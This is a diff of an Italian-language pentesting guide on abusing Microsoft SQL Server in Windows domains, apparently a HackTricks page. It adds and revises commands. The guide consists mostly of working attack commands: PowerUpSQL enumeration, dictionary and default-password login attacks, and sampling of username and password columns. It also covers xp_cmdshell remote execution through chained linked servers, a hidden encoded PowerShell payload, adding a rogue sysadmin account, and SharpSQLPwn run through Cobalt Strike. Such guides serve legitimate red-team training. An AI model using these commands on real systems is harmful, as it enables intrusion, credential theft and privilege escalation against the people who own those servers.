@@ -91,11 +91,11 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ###  Powershell
 
 Il modulo powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) è molto utile in questo caso.
-```powershell
+```bash
 Import-Module .\PowerupSQL.psd1
 ````
 ### Enumerare dalla rete senza sessione di dominio
-```powershell
+```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
@@ -108,8 +108,8 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-### Enumerazione dall'interno del dominio
-```powershell
+### Enumerare dall'interno del dominio
+```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
@@ -117,6 +117,12 @@ Get-SQLInstanceLocal | Get-SQLServerInfo
 #Get info about valid MSQL instances running in domain
 #This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
 Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
+
+# Try dictionary attack to login
+Invoke-SQLAuditWeakLoginPw
+
+# Search SPNs of common software and try the default creds
+Get-SQLServerDefaultLoginPw
 
 #Test connections with each one
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
@@ -127,14 +133,26 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## Abuso di base di MSSQL
+## MSSQL Abuso di Base
 
 ### Accesso al DB
-```powershell
+```bash
+# List databases
+Get-SQLInstanceDomain | Get-SQLDatabase
+
+# List tables in a DB you can read
+Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName
+
+# List columns in a table
+Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName
+
+# Get some sample data from a column in a table (columns username & passwor din the example)
+Get-SQLInstanceDomain | GetSQLColumnSampleData -Keywords "username,password" -Verbose -SampleSize 10
+
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
 
-#Dump an instance (a lotof CVSs generated in current dir)
+#Dump an instance (a lot of CVSs generated in current dir)
 Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
 
 # Search keywords in columns trying to access the MSSQL DBs
@@ -144,7 +162,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ### MSSQL RCE
 
 Potrebbe essere anche possibile **eseguire comandi** all'interno dell'host MSSQL
-```powershell
+```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
@@ -163,7 +181,7 @@ Se un'istanza MSSQL è fidata (link del database) da un'altra istanza MSSQL. Se 
 **I link tra i database funzionano anche attraverso le fiducia tra foreste.**
 
 ### Abuso di Powershell
-```powershell
+```bash
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
 
@@ -194,6 +212,12 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_c
 ## If you see the results of @@selectname, it worked
 Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
 ```
+Un altro strumento simile che potrebbe essere utilizzato è [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):
+```bash
+SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
+# Cobalt Strike
+inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
+```
 ### Metasploit
 
 Puoi facilmente controllare i link fidati utilizzando metasploit.
@@ -206,7 +230,7 @@ Nota che metasploit cercherà di abusare solo della funzione `openquery()` in MS
 
 ### Manuale - Openquery()
 
-Da **Linux** puoi ottenere una shell della console MSSQL con **sqsh** e **mssqlclient.py.**
+Da **Linux** puoi ottenere una shell console MSSQL con **sqsh** e **mssqlclient.py.**
 
 Da **Windows** puoi anche trovare i link ed eseguire comandi manualmente utilizzando un **client MSSQL come** [**HeidiSQL**](https://www.heidisql.com)
 
@@ -228,11 +252,11 @@ Eseguire query tramite il link (esempio: trova più link nella nuova istanza acc
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 > [!WARNING]
-> Controlla dove vengono utilizzate le virgolette doppie e singole, è importante usarle in questo modo.
+> Controlla dove vengono utilizzate le virgolette doppie e singole, è importante usarle in quel modo.
 
 ![](<../../images/image (643).png>)
 
-Puoi continuare questa catena di link fidati per sempre manualmente.
+Puoi continuare questa catena di link fidati all'infinito manualmente.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -242,7 +266,7 @@ SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", '
 ```
 Se non puoi eseguire azioni come `exec xp_cmdshell` da `openquery()`, prova con il metodo `EXECUTE`.
 
-### Manuale - EXECUTE
+### Manual - EXECUTE
 
 Puoi anche abusare dei link fidati utilizzando `EXECUTE`:
 ```bash
@@ -254,7 +278,7 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 L'**utente locale MSSQL** di solito ha un tipo speciale di privilegio chiamato **`SeImpersonatePrivilege`**. Questo consente all'account di "impersonare un client dopo l'autenticazione".
 
-Una strategia che molti autori hanno ideato è forzare un servizio SYSTEM ad autenticarsi a un servizio rogue o man-in-the-middle creato dall'attaccante. Questo servizio rogue è quindi in grado di impersonare il servizio SYSTEM mentre sta cercando di autenticarsi.
+Una strategia che molti autori hanno ideato è forzare un servizio SYSTEM ad autenticarsi a un servizio rogue o man-in-the-middle che l'attaccante crea. Questo servizio rogue è quindi in grado di impersonare il servizio SYSTEM mentre sta cercando di autenticarsi.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) ha una raccolta di queste varie tecniche che possono essere eseguite tramite il comando `execute-assembly` di Beacon.
 
